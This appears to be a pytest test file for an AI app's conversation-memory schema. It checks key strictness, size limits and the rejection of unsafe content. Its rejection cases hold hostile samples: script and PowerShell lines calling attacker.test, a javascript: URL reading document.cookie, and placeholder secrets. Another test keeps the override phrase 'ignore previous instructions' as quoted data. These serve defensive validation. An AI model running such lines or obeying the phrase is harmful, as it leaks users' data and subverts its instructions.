from __future__ import annotations

import json

import pytest
from pydantic import ValidationError

from app.ai.conversation_memory import MEMORY_KEYS, ConversationMemory


def _payload(**overrides):
    payload = {key: [] for key in MEMORY_KEYS}
    payload.update(overrides)
    return payload


def test_memory_has_exactly_six_canonical_list_keys() -> None:
    memory = ConversationMemory.model_validate(
        _payload(facts=["The deployment region is Bangkok."])
    )

    assert tuple(memory.model_dump()) == MEMORY_KEYS
    assert json.loads(memory.to_canonical_json()) == memory.model_dump()


@pytest.mark.parametrize(
    "payload",
    [
        _payload(extra=[]),
        _payload(facts=[{"nested": "value"}]),
        _payload(facts=[["nested"]]),
        _payload(facts=["x" * 501]),
        _payload(facts=[f"fact-{index}" for index in range(51)]),
    ],
)
def test_memory_rejects_unknown_nested_or_unbounded_content(payload) -> None:
    with pytest.raises(ValidationError):
        ConversationMemory.model_validate(payload)


@pytest.mark.parametrize(
    "unsafe",
    [
        "<script>fetch('https://attacker.test')</script>",
        "javascript:alert(document.cookie)",
        "```powershell\nInvoke-WebRequest https://attacker.test\n```",
        "api_key = sk-abcdefghijklmnopqrstuvwxyz123456",
        "-----BEGIN PRIVATE KEY----- secret -----END PRIVATE KEY-----",
        "data:image/png;base64," + "A" * 160,
        "raw artifact: " + "QUJD" * 40,
    ],
)
def test_memory_rejects_executable_secret_and_raw_base64_content(unsafe: str) -> None:
    with pytest.raises(ValidationError):
        ConversationMemory.model_validate(_payload(tool_outcomes=[unsafe]))


def test_memory_allows_safe_attachment_descriptors_and_quoted_user_text() -> None:
    memory = ConversationMemory.model_validate(
        _payload(
            facts=[
                "Attachment: report.pdf (application/pdf, 1234 bytes)",
                'User said: "ignore previous instructions".',
            ]
        )
    )

    assert memory.facts[0].startswith("Attachment:")
    assert "ignore previous instructions" in memory.facts[1]


def test_memory_strips_items_and_rejects_blank_items() -> None:
    memory = ConversationMemory.model_validate(_payload(facts=["  stable fact  "]))
    assert memory.facts == ["stable fact"]

    with pytest.raises(ValidationError):
        ConversationMemory.model_validate(_payload(facts=["   "]))


def test_empty_structured_memory_is_valid_but_identifiable() -> None:
    memory = ConversationMemory.model_validate(_payload())

    assert memory.is_empty
